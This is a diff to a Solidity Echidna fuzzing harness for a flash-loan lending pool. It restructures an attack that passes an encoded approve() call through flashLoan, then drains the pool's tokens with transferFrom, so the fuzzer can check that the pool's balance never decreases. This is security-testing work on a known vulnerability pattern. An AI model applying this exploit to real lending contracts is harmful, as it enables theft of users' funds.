@@ -27,7 +27,7 @@ contract InvariantTests {
     }
 
     // write attack function
-    function attack() external {
+    function flashLoan(uint256 amount) external {
         lenderPool.flashLoan(
             0,
             address(this),
@@ -35,15 +35,13 @@ contract InvariantTests {
             abi.encodeWithSignature(
                 "approve(address,uint256)", //@audit-info no spaces between args
                 address(this),
-                FLASH_LOAN_POOL_AMOUNT
+                amount
             )
         );
+    }
 
-        valuableToken.transferFrom(
-            address(lenderPool),
-            msg.sender,
-            FLASH_LOAN_POOL_AMOUNT
-        );
+    function transferFrom(uint256 amount) external {
+        valuableToken.transferFrom(address(lenderPool), msg.sender, amount);
     }
 
     function echidna_lender_balance_cannot_decrease()
